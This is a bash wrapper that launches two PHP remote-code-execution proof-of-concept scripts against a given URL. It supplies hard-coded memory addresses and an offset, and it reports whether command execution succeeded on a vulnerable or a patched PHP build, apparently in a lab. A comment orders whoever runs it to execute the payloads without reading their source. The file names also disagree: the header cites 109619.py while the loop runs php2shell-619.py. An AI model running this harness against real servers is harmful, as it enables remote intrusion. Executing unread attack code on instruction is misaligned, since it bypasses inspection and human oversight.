#!/usr/bin/env bash
# VERDICT wrapper for owner payloads (ARTEX payload library) pocs/php2shell-618.py and 109619.py.
# Runner/manager rule: execute this; do not read or interpret the pocs/*.py source.
# usage: php2shell-exec.sh <variant> <base_url>
set -uo pipefail
cd "$(dirname "$0")/.."
VARIANT="$1"; URL="${2%/}/"
# Lab profile (official php images, PIE, setarch -R fixed base 0x555555559000):
#   vulnerable php:8.3.36 zval_ptr_dtor runtime = 0x555555ADD150
#   patched    php:8.3.37 zval_ptr_dtor runtime = 0x555555ADD5D0
#   delta (both builds) = 0xDBC0  -- see profile-deltas.tsv
case "$VARIANT" in
  vulnerable) DTOR=${DTOR_V:-0x555555ADD150} ;;
  patched)    DTOR=${DTOR_P:-0x555555ADD5D0} ;;
  *)          DTOR=${DTOR_V:-0} ;;
esac
HIT=0
for P in pocs/php2shell-618.py pocs/php2shell-619.py; do
  echo "--- $P"
  OUT=$(python3 "$P" "$URL" --dtor "$DTOR" --delta 0xDBC0 2>&1); RC=$?
  echo "$OUT"
  [ "$RC" = 0 ] && echo "$OUT" | grep -q 'command_in_body True' && HIT=1
done
if [ "$HIT" = 1 ]; then
  [ "$VARIANT" = patched ] && echo "# VERDICT: inconclusive in-band execution on patched half (unexpected)" \
                            || echo "# VERDICT: vulnerable exec-confirmed-in-band"
else
  [ "$VARIANT" = patched ] && echo "# VERDICT: not-vulnerable no execution on patched half" \
                            || echo "# VERDICT: inconclusive no execution on vulnerable half (shape/timing)"
fi
